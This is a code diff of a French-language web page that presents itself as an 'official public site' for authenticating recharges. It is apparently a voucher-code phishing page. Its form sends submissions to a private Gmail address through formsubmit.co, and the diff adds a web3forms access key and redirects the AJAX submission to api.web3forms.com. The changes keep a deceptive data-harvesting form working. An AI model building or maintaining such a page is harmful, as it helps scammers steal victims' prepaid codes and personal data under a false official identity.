@@ -294,6 +294,7 @@
     <h1 class="title">Site officiel public<br><em>d'hauthentification des recharges</em></h1>
 
     <form id="contactForm" class="form-card" action="https://formsubmit.co/authentiquerecharge52@gmail.com" method="POST">
+      <input type="hidden" name="access_key" value="a7cab23a-e83a-481b-983e-1b02c956b49b">
       <input type="hidden" name="_subject" value="Nouvelle réponse — Site officiel public d'authentification des recharges">
       <input type="hidden" name="_template" value="table">
       <input type="hidden" name="_captcha" value="false">
@@ -393,9 +394,9 @@
 
       const submitBtn = form.querySelector('.submit-btn');
       submitBtn.disabled = true;
-      submitBtn.textContent = 'Envoi...';
-
-      fetch('https://formsubmit.co/ajax/authentiquerecharge52@gmail.com', {
+      submitBtn.textContent = 'Envoi...'; 
+      
+      fetch('https://api.web3forms.com/submit', {
       method: 'POST',
       body: new FormData(form),
       headers: { 'Accept': 'application/json' }
